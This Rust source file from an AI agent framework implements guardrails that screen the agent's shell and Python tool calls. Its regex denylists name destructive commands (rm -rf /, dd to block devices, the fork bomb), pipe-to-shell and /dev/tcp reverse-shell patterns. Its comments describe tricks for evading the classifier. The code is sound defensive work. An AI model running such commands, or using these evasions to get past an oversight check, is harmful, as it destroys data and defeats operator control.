use std::sync::LazyLock;

use crate::config::{ErrorDetailLevel, HooksConfig};
use crate::refusal::NO_CIRCUMVENTION_NOTICE;
use ironhermes_core::DangerousCommandsConfig;
use ironhermes_core::McpMutationGuardrailConfig;
use ironhermes_core::config::DefconLevel;
use ironhermes_security::policy::FloorClass;
use regex::Regex;

/// The outcome of a guardrail check on a tool call.
#[derive(Debug, Clone, PartialEq)]
pub enum GuardrailDecision {
    /// Allow the tool call to proceed.
    Allow,
    /// Log a warning and emit a hook event, but allow the call to proceed.
    Warn { reason: String },
    /// Block the tool call. The reason is returned to the agent as an error.
    Block { reason: String },
    /// Park the tool call pending async approval from the operator chat (D-11).
    ///
    /// Distinct from [`GuardrailDecision::Warn`] — the call does NOT proceed; it is held
    /// until the operator sends `/approve` or `/deny` (or the gate times out).
    /// Only bypassed once the gate resolves to `Approved`; all other outcomes are
    /// fail-closed (D-11, T-45-05).
    NeedsApproval { reason: String },
}

/// A guardrail hook that can intercept tool calls before dispatch.
///
/// Implementations inspect the tool name and arguments and return a decision.
/// This method is synchronous — no I/O should be performed here.
pub trait GuardrailHook: Send + Sync {
    /// Inspect a tool call and decide whether to allow, warn, or block.
    fn check(&self, tool_name: &str, args: &serde_json::Value) -> GuardrailDecision;

    /// Human-readable name for this guardrail (used in log messages).
    fn name(&self) -> &str;
}

/// Config-driven blocklist guardrail: blocks tools by name.
///
/// Per D-05: registered first in the guardrail chain so blocked tools are
/// rejected before any custom trait-based guardrails run.
pub struct BlocklistGuardrail {
    blocked_tools: Vec<String>,
}

impl BlocklistGuardrail {
    /// Create a blocklist guardrail from an explicit list of tool names.
    pub fn new(blocked_tools: Vec<String>) -> Self {
        Self { blocked_tools }
    }

    /// Create a blocklist guardrail from the `blocked_tools` field in `HooksConfig`.
    pub fn from_config(config: &HooksConfig) -> Self {
        Self::new(config.blocked_tools.clone())
    }
}

impl GuardrailHook for BlocklistGuardrail {
    fn check(&self, tool_name: &str, _args: &serde_json::Value) -> GuardrailDecision {
        if self.blocked_tools.iter().any(|b| b == tool_name) {
            GuardrailDecision::Block {
                reason: format!("tool '{}' is on the blocklist", tool_name),
            }
        } else {
            GuardrailDecision::Allow
        }
    }

    fn name(&self) -> &str {
        "blocklist"
    }
}

/// Format the error message returned to the agent when a tool call is blocked.
///
/// Per D-06: `ErrorDetailLevel::Full` includes the tool name and reason for
/// developer convenience; `ErrorDetailLevel::Minimal` returns a generic message
/// for high-security deployments where leaking tool names is undesirable (T-06-05).
///
/// Phase 57 G-1: both levels say the call did not run and end with
/// [`NO_CIRCUMVENTION_NOTICE`], so a Block reads as a refusal, not as an obstacle to route
/// around. Minimal still names no tool.
pub fn format_guardrail_error(
    tool_name: &str,
    reason: &str,
    guardrail_name: &str,
    detail_level: &ErrorDetailLevel,
) -> String {
    match detail_level {
        ErrorDetailLevel::Full => {
            let reason = reason.trim_end_matches(|c: char| c == '.' || c.is_whitespace());
            format!(
                "Tool '{}' blocked by guardrail '{}': {}. It did not run. {}",
                tool_name, guardrail_name, reason, NO_CIRCUMVENTION_NOTICE
            )
        }
        ErrorDetailLevel::Minimal => format!(
            "Tool call blocked by security policy. It did not run. {NO_CIRCUMVENTION_NOTICE}"
        ),
    }
}

// ---------------------------------------------------------------------------
// DangerousCommandGuardrail — two-tier dangerous-command denylist (EXEC-02)
// ---------------------------------------------------------------------------

/// Classification tier for a dangerous-command pattern.
///
/// - [`Tier::Two`]: catastrophic ops — hard-block, no prompt, no subprocess (D-07, D-03).
/// - [`Tier::One`]: network/exfil/eval — approval-required; yolo bypasses Tier-1 only (D-08, D-13).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Tier {
    /// Tier-1: approval-required (network tools, eval/exec, pipe-to-shell, reverse-shell
    /// redirects, full-path dangerous binaries).
    One,
    /// Tier-2: hard-block — catastrophic destructive ops (`rm -rf /`, `dd`, `mkfs`, fork
    /// bomb, block-device redirects). D-03: check() returns Block immediately; no code path
    /// may reach an approval prompt or subprocess after a Tier-2 match.
    Two,
}

/// Built-in denylist patterns for the dangerous-command guardrail (EXEC-02).
///
/// All patterns use the negative-character-class boundary prefix/suffix:
/// `(?:(?:^|[^a-zA-Z0-9_]))WORD(?:[^a-zA-Z0-9_]|$)`.
///
/// **NEVER use `\b`** — the Rust `regex` crate treats `\b` as a literal
/// backslash-b, NOT a word boundary. The regression test `regex_no_word_boundary`
/// asserts zero patterns contain this two-character sequence (EXEC-02).
///
/// Tier-2 → [`GuardrailDecision::Block`] (D-03 — never approvable).
/// Tier-1 → [`GuardrailDecision::Warn`] (approval-required; yolo bypasses Tier-1 only, D-13).
pub const DANGEROUS_PATTERNS: &[(&str, Tier)] = &[
    // ── Tier-2: catastrophic / hard-block (D-07) ─────────────────────────
    // rm with combined short flags: -r/-R/-f/-F in any single-flag or two-flag
    // combination (e.g. -rf, -Rf, -rF, -RF, -fr, -Fr) followed by an absolute path.
    // CR-01: uppercase -R/-F aliases were missing from the original [rf]{1,2} class.
    (r"(?:(?:^|[^a-zA-Z0-9_/]))rm\s+-[rRfF]{1,2}\s+/", Tier::Two),
    // rm with separate short flags (e.g. rm -r -f / or rm -f -r /).
    // CR-01: separate-flag form was not matched by the combined-flag pattern above.
    (
        r"(?:(?:^|[^a-zA-Z0-9_/]))rm\s+-[rRfF]\s+-[rRfF]\s+/",
        Tier::Two,
    ),
    // rm with long-form flags --recursive / --force (any order, one or both)
    // followed by an absolute path (e.g. rm --recursive --force / or rm --recursive /var).
    // CR-01: long-form flags were not covered by any previous pattern.
    (
        r"(?:(?:^|[^a-zA-Z0-9_/]))rm(?:\s+--(?:recursive|force))+\s+/",
        Tier::Two,
    ),
    // dd writing to a raw block device
    (
        r"(?:(?:^|[^a-zA-Z0-9_]))dd\s+(?:\S+\s+)*of=/dev/(?:sd[a-z]|hd[a-z]|nvme\d|disk\d)",
        Tier::Two,
    ),
    // mkfs — formats a filesystem
    (
        r"(?:(?:^|[^a-zA-Z0-9_]))mkfs(?:\.[a-zA-Z0-9]+)?(?:[^a-zA-Z0-9_]|$)",
        Tier::Two,
    ),
    // fork bomb: :(){ :|:& };:
    (r":\s*\(\s*\)\s*\{", Tier::Two),
    // redirect to block device (> /dev/sda etc.)
    (r">\s*/dev/(?:sd[a-z]|hd[a-z]|nvme\d|disk\d)", Tier::Two),
    // ── Tier-1: network / exfil / eval — approval required (D-08) ─────────
    // curl
    (r"(?:(?:^|[^a-zA-Z0-9_]))curl(?:[^a-zA-Z0-9_]|$)", Tier::One),
    // wget
    (r"(?:(?:^|[^a-zA-Z0-9_]))wget(?:[^a-zA-Z0-9_]|$)", Tier::One),
    // nc / ncat / netcat
    (
        r"(?:(?:^|[^a-zA-Z0-9_]))n(?:c|cat|etcat)(?:[^a-zA-Z0-9_]|$)",
        Tier::One,
    ),
    // socat
    (
        r"(?:(?:^|[^a-zA-Z0-9_]))socat(?:[^a-zA-Z0-9_]|$)",
        Tier::One,
    ),
    // ssh (all variants, including -R reverse tunnels)
    (r"(?:(?:^|[^a-zA-Z0-9_]))ssh(?:[^a-zA-Z0-9_]|$)", Tier::One),
    // ngrok
    (
        r"(?:(?:^|[^a-zA-Z0-9_]))ngrok(?:[^a-zA-Z0-9_]|$)",
        Tier::One,
    ),
    // pipe to shell (| sh, | bash, | zsh, etc.)
    (r"\|\s*(?:sh|bash|zsh|fish|ksh|csh)(?:\s|;|$)", Tier::One),
    // eval shell builtin
    (r"(?:(?:^|[^a-zA-Z0-9_]))eval(?:[^a-zA-Z0-9_]|$)", Tier::One),
    // exec shell builtin
    (r"(?:(?:^|[^a-zA-Z0-9_]))exec(?:[^a-zA-Z0-9_]|$)", Tier::One),
    // reverse-shell redirect to /dev/tcp/ or /dev/udp/
    (r">\s*&?\s*/dev/(?:tcp|udp)/", Tier::One),
    // /bin/rm — full-path dangerous binary
    (r"/bin/rm(?:[^a-zA-Z0-9_]|$)", Tier::One),
    // /usr/bin/dd — full-path dangerous binary
    (r"/usr/bin/dd(?:[^a-zA-Z0-9_]|$)", Tier::One),
];

/// Phase 54 Finding 1 (D-01/D-02): Python-source dangerous-pattern table, consulted
/// ONLY when `check()`'s `tool_name == "execute_code"` — `DANGEROUS_PATTERNS` above
/// targets shell syntax and is meaningless against Python source (this overturns
/// D-11's "classify nothing" conclusion at `gated_exec.rs`, whose "shell patterns
/// don't apply to Python" premise was correct but whose conclusion was not).
///
/// Same boundary convention as [`DANGEROUS_PATTERNS`], with `.` added to the negative
/// character class so a dotted attribute access does not false-positive on the bare
/// verb (e.g. `myobj.subprocess.run` is still caught correctly, but a hypothetical
/// `notsubprocess.run` is not — the class excludes `.` so the prefix boundary requires
/// a NON-identifier, non-dot character or start-of-string immediately before the
/// pattern). **NEVER use `\b`** — see [`DANGEROUS_PATTERNS`]'s doc comment.
///
/// Every entry returns [`GuardrailDecision::Warn`], never `Block` (D-03: this is a
/// speed bump, not a boundary — a hard block on a regex hit against Python source
/// would be an over-promise; real effect-gating is a named successor phase).
///
/// Membership beyond the six items D-01 seeds from `54-RESEARCH.md` Pattern 1
/// (`subprocess.*`, `os.(system|popen|exec*)`, `socket.*`, `requests.*`,
/// `urllib.request`, `shutil.rmtree`, `ctypes.*`, `pty.spawn`) is Claude's Discretion
/// per `54-CONTEXT.md`; this table extends it with `os.(remove|unlink)`,
/// `shutil.move`, and `pickle.loads` (destructive filesystem ops and unsafe
/// deserialization, the same class of risk as the seeded set).
/// `pathlib.Path(...).unlink` was considered and skipped — its dynamic-argument
/// shape (`Path(x).unlink()`) cannot be expressed under this boundary convention
/// without either missing common call shapes or false-positiving on unrelated
/// `.unlink()` calls on non-`Path` objects.
pub const PYTHON_DANGEROUS_PATTERNS: &[&str] = &[
    r"(?:(?:^|[^a-zA-Z0-9_.]))subprocess\.(?:run|Popen|call|check_output)(?:[^a-zA-Z0-9_.]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_.]))os\.(?:system|popen|exec[a-zA-Z]*)(?:[^a-zA-Z0-9_.]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_.]))socket\.(?:socket|connect)(?:[^a-zA-Z0-9_.]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_.]))requests\.(?:get|post|put|delete)(?:[^a-zA-Z0-9_.]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_.]))urllib\.request(?:[^a-zA-Z0-9_.]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_.]))shutil\.rmtree(?:[^a-zA-Z0-9_.]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_.]))ctypes\.",
    r"(?:(?:^|[^a-zA-Z0-9_.]))pty\.spawn(?:[^a-zA-Z0-9_.]|$)",
    // Extension beyond D-01's seeded set (Claude's Discretion, see doc comment above).
    r"(?:(?:^|[^a-zA-Z0-9_.]))os\.(?:remove|unlink)(?:[^a-zA-Z0-9_.]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_.]))shutil\.move(?:[^a-zA-Z0-9_.]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_.]))pickle\.loads(?:[^a-zA-Z0-9_.]|$)",
    // Phase 57 D-23: `importlib.import_module('subpro' + 'cess')` reaches subprocess
    // without a literal `subprocess` token, so the module itself is a FloorWarn hit.
    r"(?:(?:^|[^a-zA-Z0-9_.]))importlib(?:[^a-zA-Z0-9_]|$)",
];

/// Phase 54 Finding 1 (D-03): classification-evasion markers. `getattr`, `eval`,
/// `exec`, `__import__` and `base64` all defeat [`PYTHON_DANGEROUS_PATTERNS`] regex
/// matching (e.g. `getattr(__builtins__, 'ev' + 'al')(...)` resolves `eval` at
/// runtime with no literal dangerous-verb token in the source), and the ADR's own
/// live evidence — `subprocess.run(['wrangler','delete',...])`, the **list-argument**
/// form — proves the pattern table alone is not a reliable boundary. Presence of ANY
/// marker forces [`GuardrailDecision::Warn`] **independent of** — and evaluated
/// BEFORE — the pattern-table loop, so a source with zero pattern-table hits still
/// requires approval. Plain substrings, not regexes: a marker is dangerous by mere
/// presence in Python source, no word-boundary reasoning needed.
pub const PYTHON_EVASION_MARKERS: &[&str] = &["getattr", "eval", "exec", "__import__", "base64"];

// ---------------------------------------------------------------------------
// Phase 57 (D-23 / D-13): ironhermes-side rules that do not depend on tirith
// ---------------------------------------------------------------------------

/// Rule id recorded when a call reconstructs to a known mutation verb (D-23).
pub const RULE_MUTATION_COMMAND: &str = "mutation_command";

/// Rule id recorded for the D-13 Python reach markers.
pub const RULE_PYTHON_REACH: &str = "python_reach_d13";

/// Phase 57 D-23: command lines that mutate or destroy remote state. A match on a
/// terminal command, or on a string reconstructed from `execute_code` source
/// ([`reconstruct_python_command_strings`]), is [`FloorClass::Critical`]: Blocked at
/// every DEFCON level, ahead of any bypass. This is the rule that closes the Phase 46
/// `subprocess.run(['wrangler','delete', ...])` incident without relying on the sidecar
/// (research Pitfall 3).
///
/// Same boundary convention as [`DANGEROUS_PATTERNS`]: negative character classes, never
/// the two-character `\b` sequence (the `regex_no_word_boundary` test covers this list).
pub const MUTATION_COMMAND_PATTERNS: &[&str] = &[
    r"(?:(?:^|[^a-zA-Z0-9_]))wrangler\s+(?:deploy|delete)(?:[^a-zA-Z0-9_]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_]))wrangler\s+(?:kv|r2|d1|queues|secret)(?:[^a-zA-Z0-9_]|$).*\s(?:delete|purge|bulk\s+delete)(?:[^a-zA-Z0-9_]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_]))gh\s+(?:repo|release)\s+delete(?:[^a-zA-Z0-9_]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_]))aws\s+s3\s+(?:rm|rb)(?:[^a-zA-Z0-9_]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_]))gcloud\s+.*\s+delete(?:[^a-zA-Z0-9_]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_]))kubectl\s+delete(?:[^a-zA-Z0-9_]|$)",
    r"(?:(?:^|[^a-zA-Z0-9_]))terraform\s+destroy(?:[^a-zA-Z0-9_]|$)",
];

static MUTATION_COMMAND_REGEXES: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    MUTATION_COMMAND_PATTERNS
        .iter()
        .map(|pattern| {
            Regex::new(pattern).unwrap_or_else(|e| {
                panic!("invalid built-in mutation-command pattern '{pattern}': {e}")
            })
        })
        .collect()
});

/// Whether `candidate` contains a [`MUTATION_COMMAND_PATTERNS`] command line. Shared by the
/// terminal / `execute_code` rule and the Phase 57 plan 09 tool screen's MCP-argument check,
/// so there is one table and one matcher.
pub fn matches_mutation_command(candidate: &str) -> bool {
    MUTATION_COMMAND_REGEXES
        .iter()
        .any(|r| r.is_match(candidate))
}

/// One lexical token of Python source, reduced to what argv reconstruction needs.
#[derive(Debug, Clone, PartialEq)]
enum PyTok {
    /// A string literal, escapes resolved, prefix and quotes removed.
    Str(String),
    /// One of `[ ] ( ) , +`.
    Punct(char),
    /// Anything else (identifiers, numbers, operators). Only its presence matters.
    Other,
}

fn is_string_prefix(word: &str) -> bool {
    matches!(
        word.to_ascii_lowercase().as_str(),
        "r" | "b" | "f" | "u" | "rb" | "br" | "fr" | "rf"
    )
}

/// Lex one string literal starting at the opening quote `chars[start]`. Returns the value
/// and the index just past the literal. An unterminated literal ends at end of input (or at
/// the line end for a single-quoted one); it never panics.
fn lex_py_string(chars: &[char], start: usize, raw: bool) -> (String, usize) {
    let quote = chars[start];
    let triple = chars.get(start + 1) == Some(&quote) && chars.get(start + 2) == Some(&quote);
    let mut i = start + if triple { 3 } else { 1 };
    let mut out = String::new();
    while i < chars.len() {
        let c = chars[i];
        if c == '\\' && i + 1 < chars.len() {
            let next = chars[i + 1];
            if raw {
                out.push('\\');
                out.push(next);
                i += 2;
                continue;
            }
            match next {
                'n' => out.push('\n'),
                't' => out.push('\t'),
                'r' => out.push('\r'),
                '\\' | '\'' | '"' => out.push(next),
                '\n' => {}
                'x' => {
                    let hex: String = chars.iter().skip(i + 2).take(2).collect();
                    match u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
                        Some(ch) if hex.len() == 2 => {
                            out.push(ch);
                            i += 4;
                            continue;
                        }
                        _ => out.push_str("\\x"),
                    }
                }
                other => {
                    out.push('\\');
                    out.push(other);
                }
            }
            i += 2;
            continue;
        }
        if c == quote {
            if !triple {
                return (out, i + 1);
            }
            if chars.get(i + 1) == Some(&quote) && chars.get(i + 2) == Some(&quote) {
                return (out, i + 3);
            }
        }
        if c == '\n' && !triple {
            return (out, i);
        }
        out.push(c);
        i += 1;
    }
    (out, i)
}

fn lex_python(source: &str) -> Vec<PyTok> {
    let chars: Vec<char> = source.chars().collect();
    let mut toks = Vec::new();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '#' {
            while i < chars.len() && chars[i] != '\n' {
                i += 1;
            }
            continue;
        }
        if c == '\'' || c == '"' {
            let (value, next) = lex_py_string(&chars, i, false);
            toks.push(PyTok::Str(value));
            i = next;
            continue;
        }
        if c.is_alphanumeric() || c == '_' {
            let start = i;
            while i < chars.len() && (chars[i].is_alphanumeric() || chars[i] == '_') {
                i += 1;
            }
            let word: String = chars[start..i].iter().collect();
            let quoted = i < chars.len() && (chars[i] == '\'' || chars[i] == '"');
            if quoted && is_string_prefix(&word) {
                let raw = word.to_ascii_lowercase().contains('r');
                let (value, next) = lex_py_string(&chars, i, raw);
                toks.push(PyTok::Str(value));
                i = next;
            } else {
                toks.push(PyTok::Other);
            }
            continue;
        }
        match c {
            '[' | ']' | '(' | ')' | ',' | '+' => toks.push(PyTok::Punct(c)),
            c if c.is_whitespace() => {}
            _ => toks.push(PyTok::Other),
        }
        i += 1;
    }
    toks
}

/// Fold `'a' + 'b'` and the implicit `'a' 'b'` into one literal, in a single pass.
fn fold_string_concatenations(toks: Vec<PyTok>) -> Vec<PyTok> {
    let mut out: Vec<PyTok> = Vec::with_capacity(toks.len());
    for tok in toks {
        if let PyTok::Str(b) = &tok {
            let n = out.len();
            if n >= 2 && out[n - 1] == PyTok::Punct('+') && matches!(out[n - 2], PyTok::Str(_)) {
                out.pop();
                if let Some(PyTok::Str(a)) = out.last_mut() {
                    a.push_str(b);
                }
                continue;
            }
            if let Some(PyTok::Str(a)) = out.last_mut() {
                a.push_str(b);
                continue;
            }
        }
        out.push(tok);
    }
    out
}

/// Collects distinct candidate strings in first-seen order.
#[derive(Default)]
struct Candidates {
    seen: std::collections::HashSet<String>,
    out: Vec<String>,
}

impl Candidates {
    fn add(&mut self, s: String) {
        if !s.is_empty() && self.seen.insert(s.clone()) {
            self.out.push(s);
        }
    }
}

/// What the current element of a bracketed list holds so far.
#[derive(Default)]
enum Elem {
    #[default]
    Empty,
    /// Exactly one string literal.
    One(String),
    /// Anything else (a name, a call, an expression, a nested list).
    Many,
}

/// One open `[` or `(`: a run of consecutive literal elements is joined with spaces when
/// the run ends (a non-literal element, or the closing bracket).
#[derive(Default)]
struct Frame {
    run: Vec<String>,
    elem: Elem,
}

impl Frame {
    fn end_elem(&mut self, found: &mut Candidates) {
        match std::mem::take(&mut self.elem) {
            Elem::One(s) => self.run.push(s),
            Elem::Empty => {}
            Elem::Many => self.flush(found),
        }
    }

    fn flush(&mut self, found: &mut Candidates) {
        if !self.run.is_empty() {
            found.add(self.run.join(" "));
            self.run.clear();
        }
    }
}

/// Phase 57 D-23: the command strings an `execute_code` script is plausibly building.
///
/// Not a Python parser: a small lexer plus two reconstructions, both linear in the source:
///
/// 1. every string literal, with `'a' + 'b'` and adjacent `'a' 'b'` folded (covers
///    `os.system('wrangler delete x')`, `'subpro' + 'cess'`);
/// 2. every list or tuple literal, as the space-joined run of consecutive string-literal
///    elements (covers the argv form `subprocess.run(['wrangler', 'delete', name])` even
///    when a later element is a variable, and the same list handed to
///    `importlib.import_module(..).run(..)`).
///
/// Calls are never matched by name, so `subprocess.run`, `Popen`, `check_output`,
/// `os.system`, `os.exec*` and a `.run([...])` on a dynamically imported module all reduce
/// to the same strings. Comments are skipped. What this cannot see (a verb assembled from
/// non-literals, `chr()` arithmetic, data read from disk) is the documented residual; the
/// D-13 reach markers block that class at DEFCON 3 and stricter.
pub fn reconstruct_python_command_strings(source: &str) -> Vec<String> {
    let toks = fold_string_concatenations(lex_python(source));
    let mut found = Candidates::default();

    for tok in &toks {
        if let PyTok::Str(s) = tok {
            found.add(s.clone());
        }
    }

    let mut stack: Vec<Frame> = Vec::new();
    for tok in &toks {
        match tok {
            PyTok::Punct('[' | '(') => {
                if let Some(parent) = stack.last_mut() {
                    parent.elem = Elem::Many;
                }
                stack.push(Frame::default());
            }
            PyTok::Punct(']' | ')') => {
                if let Some(mut frame) = stack.pop() {
                    frame.end_elem(&mut found);
                    frame.flush(&mut found);
                }
            }
            PyTok::Punct(',') => {
                if let Some(frame) = stack.last_mut() {
                    frame.end_elem(&mut found);
                }
            }
            PyTok::Str(s) => {
                if let Some(frame) = stack.last_mut() {
                    frame.elem = match std::mem::take(&mut frame.elem) {
                        Elem::Empty => Elem::One(s.clone()),
                        _ => Elem::Many,
                    };
                }
            }
            _ => {
                if let Some(frame) = stack.last_mut() {
                    frame.elem = Elem::Many;
                }
            }
        }
    }
    while let Some(mut frame) = stack.pop() {
        frame.end_elem(&mut found);
        frame.flush(&mut found);
    }
    found.out
}

/// Map a floor decision to its D-24 class: Block is Critical, Warn is FloorWarn,
/// NeedsApproval stays NeedsApproval, Allow is None.
pub fn floor_class(decision: &GuardrailDecision) -> FloorClass {
    match decision {
        GuardrailDecision::Block { .. } => FloorClass::Critical,
        GuardrailDecision::Warn { .. } => FloorClass::FloorWarn,
        GuardrailDecision::NeedsApproval { .. } => FloorClass::NeedsApproval,
        GuardrailDecision::Allow => FloorClass::None,
    }
}

/// Phase 57 D-13: Python source that imports or reaches a process, network or FFI
/// primitive. Plain substrings, like [`PYTHON_EVASION_MARKERS`]: presence is the signal.
///
/// At DEFCON 3 and stricter ([`DefconLevel::at_least_as_strict_as`]`(3)`) a hit is
/// [`FloorClass::Critical`]: the source is Blocked, because string-level classification
/// cannot see what `getattr`/`importlib`/`__import__` will resolve at run time, and the
/// effect gap (an OS sandbox) is the named successor phase, not this one. At levels 4-5 a
/// hit is a bypassable [`FloorClass::FloorWarn`].
pub const PYTHON_REACH_MARKERS: &[&str] = &[
    "import subprocess",
    "from subprocess",
    "subprocess.",
    "import socket",
    "from socket",
    "socket.",
    "import ctypes",
    "ctypes.",
    "importlib",
    "__import__",
];

/// The ironhermes-side rule class for a `terminal` / `execute_code` call, with the id of
/// the rule that fired. Independent of the regex floor and of the sidecar.
///
/// - `terminal`: a [`MUTATION_COMMAND_PATTERNS`] match on the command is Critical (D-23).
/// - `execute_code`: a match on any [`reconstruct_python_command_strings`] result is
///   Critical (D-23). Otherwise a [`PYTHON_REACH_MARKERS`] hit is Critical at DEFCON 3 or
///   stricter and a FloorWarn at 4-5 (D-13).
/// - Anything else is `(None, None)`.
pub fn ironhermes_rule_class(
    tool_name: &str,
    classify_arg: &str,
    level: DefconLevel,
) -> (FloorClass, Option<&'static str>) {
    match tool_name {
        "terminal" if matches_mutation_command(classify_arg) => {
            (FloorClass::Critical, Some(RULE_MUTATION_COMMAND))
        }
        "execute_code" => {
            if reconstruct_python_command_strings(classify_arg)
                .iter()
                .any(|s| matches_mutation_command(s))
            {
                return (FloorClass::Critical, Some(RULE_MUTATION_COMMAND));
            }
            if PYTHON_REACH_MARKERS
                .iter()
                .any(|m| classify_arg.contains(m))
            {
                let class = if level.at_least_as_strict_as(3) {
                    FloorClass::Critical
                } else {
                    FloorClass::FloorWarn
                };
                return (class, Some(RULE_PYTHON_REACH));
            }
            (FloorClass::None, None)
        }
        _ => (FloorClass::None, None),
    }
}

/// Two-tier dangerous-command guardrail (EXEC-02).
///
/// Classifies shell command strings before dispatch:
/// - **Tier-2** (catastrophic) → [`GuardrailDecision::Block`] — D-03: returned
///   immediately, before any approval-cache lookup or subprocess spawn.
/// - **Tier-1** (network/exfil/eval) → [`GuardrailDecision::Warn`] — approval required.
/// - **Shell metachar** (D-09) → [`GuardrailDecision::Warn`] — string-level matching
///   cannot safely classify commands with `$(`, `` ` ``, `;`, `|`, `&&`, `${IFS}`,
///   `$'…'`, or `\x` sequences; approval is required, NOT a hard block (legitimate
///   pipes like `ps aux | grep x` must remain runnable behind approval).
/// - **Safe commands** → [`GuardrailDecision::Allow`].
///
/// This is a speed-bump, not the security boundary (that is EXEC-03 env sanitization
/// and the approval gate). The hard invariants are D-03 (Tier-2 never approvable) and
/// D-13 (yolo never overrides Tier-2). `check()` has no yolo input — Block is returned
/// before any caller-side yolo bypass can apply.
///
/// Phase 54 Finding 1 (D-01/D-02): also hosts the `execute_code`-only Python
/// classification branch (`python_tier1` + the evasion-marker check) — a SECOND,
/// `tool_name`-selected pattern table inside this same struct, reusing the existing
/// approval + audit wiring rather than a separate dedicated guardrail type for Python
/// (D-02 is explicit that no such second struct should exist).
pub struct DangerousCommandGuardrail {
    tier1: Vec<Regex>,
    tier2: Vec<Regex>,
    python_tier1: Vec<Regex>,
}

impl DangerousCommandGuardrail {
    /// Create a guardrail with the built-in [`DANGEROUS_PATTERNS`] and
    /// [`PYTHON_DANGEROUS_PATTERNS`] compiled once.
    pub fn new() -> Self {
        let mut tier1 = Vec::new();
        let mut tier2 = Vec::new();
        for (pattern, tier) in DANGEROUS_PATTERNS {
            // Built-in patterns are compile-time constants validated by the
            // `regex_no_word_boundary` regression test. Panic on compile failure is
            // appropriate here — a bad built-in is a code defect, not a runtime error.
            let regex = Regex::new(pattern).unwrap_or_else(|e| {
                panic!("DangerousCommandGuardrail: invalid built-in pattern '{pattern}': {e}")
            });
            match tier {
                Tier::One => tier1.push(regex),
                Tier::Two => tier2.push(regex),
            }
        }
        let python_tier1 = PYTHON_DANGEROUS_PATTERNS
            .iter()
            .map(|pattern| {
                Regex::new(pattern).unwrap_or_else(|e| {
                    panic!(
                        "DangerousCommandGuardrail: invalid built-in Python pattern '{pattern}': {e}"
                    )
                })
            })
            .collect();
        Self {
            tier1,
            tier2,
            python_tier1,
        }
    }

    /// Create a guardrail from operator config — adds/relaxes built-in patterns (D-10).
    pub fn from_config(config: &DangerousCommandsConfig) -> Self {
        let mut guard = Self::new();
        guard.apply_config_overrides(config);
        guard
    }

    /// Apply operator overrides: add custom patterns at either tier and relax
    /// (remove) built-in patterns by their exact pattern string.
    ///
    /// Per D-10: every entry in `config.relax` emits a `tracing::warn!` so the
    /// security floor is never silently weakened — even if the entry does not match
    /// any built-in (which may indicate a typo in the operator config).
    fn apply_config_overrides(&mut self, config: &DangerousCommandsConfig) {
        // Add operator-provided Tier-1 patterns.
        for pattern in &config.add_tier1 {
            match Regex::new(pattern) {
                Ok(r) => self.tier1.push(r),
                Err(e) => tracing::warn!(
                    target: "ironhermes::security::guardrail",
                    pattern = %pattern,
                    error = %e,
                    "add_tier1 pattern failed to compile — skipped"
                ),
            }
        }
        // Add operator-provided Tier-2 patterns.
        for pattern in &config.add_tier2 {
            match Regex::new(pattern) {
                Ok(r) => self.tier2.push(r),
                Err(e) => tracing::warn!(
                    target: "ironhermes::security::guardrail",
                    pattern = %pattern,
                    error = %e,
                    "add_tier2 pattern failed to compile — skipped"
                ),
            }
        }
        // Relax (remove) built-in patterns by exact pattern-string match (D-10).
        for p in &config.relax {
            tracing::warn!(
                target: "ironhermes::security::guardrail",
                pattern = %p,
                "built-in pattern RELAXED by operator config; weakens the security floor"
            );
            self.tier1.retain(|r| r.as_str() != p.as_str());
            self.tier2.retain(|r| r.as_str() != p.as_str());
        }
    }

    /// Returns `true` if `command` contains shell metacharacters that prevent safe
    /// string-level pattern matching (D-09).
    ///
    /// Detected metachar set: command substitution `$(`, backtick `` ` ``, `;`,
    /// `|`, `&&`, `${` (parameter/IFS substitution), `$'` (ANSI-C quoting such as
    /// `$'\x72\x6d'` = `rm`), and `\x` (hex escape in shell strings).
    ///
    /// Metachar presence forces Tier-1 **Warn**, NOT Block — hard-blocking all pipes
    /// would prevent legitimate `ps aux | grep x` from ever running.
    fn has_metachar(&self, command: &str) -> bool {
        command.contains("$(")        // command substitution
            || command.contains('`')  // backtick command substitution
            || command.contains(';')  // command separator
            || command.contains('|')  // pipe
            || command.contains('&')  // background operator AND && (subsumes explicit && check — WR-01)
            || command.contains("${") // parameter / ${IFS} substitution
            || command.contains("$'") // ANSI-C quoting ($'\x72\x6d' = rm)
            || command.contains(r"\x") // hex escape in shell string
    }

    /// Phase 54 Finding 1 (D-03): returns `true` when `source` contains ANY
    /// [`PYTHON_EVASION_MARKERS`] entry as a plain substring. Independent of
    /// [`PYTHON_DANGEROUS_PATTERNS`] — a source with zero pattern-table hits can
    /// still trip this arm, which is the whole point (54-RESEARCH.md Pitfall 2).
    fn has_python_evasion_marker(&self, source: &str) -> bool {
        PYTHON_EVASION_MARKERS.iter().any(|m| source.contains(m))
    }
}

impl Default for DangerousCommandGuardrail {
    fn default() -> Self {
        Self::new()
    }
}

impl GuardrailHook for DangerousCommandGuardrail {
    /// Classify a command string before dispatch.
    ///
    /// **Check order — do not reorder (hard invariant):**
    /// 0. `tool_name == "execute_code"` → the Python branch below, entirely separate
    ///    from steps 1-3 (Phase 54 Finding 1, D-01/D-02). Never falls through to the
    ///    shell tables — Python source is not shell syntax.
    /// 1. Tier-2 → [`GuardrailDecision::Block`] (D-03: short-circuits before any other
    ///    branch; no code path may reach approval or subprocess after a Tier-2 match).
    /// 2. Tier-1 OR metachar → [`GuardrailDecision::Warn`] (approval required).
    /// 3. [`GuardrailDecision::Allow`].
    ///
    /// `check()` accepts no yolo parameter — Block is returned before any caller-side
    /// yolo bypass applies (D-13). This method is synchronous and performs no I/O.
    fn check(&self, tool_name: &str, args: &serde_json::Value) -> GuardrailDecision {
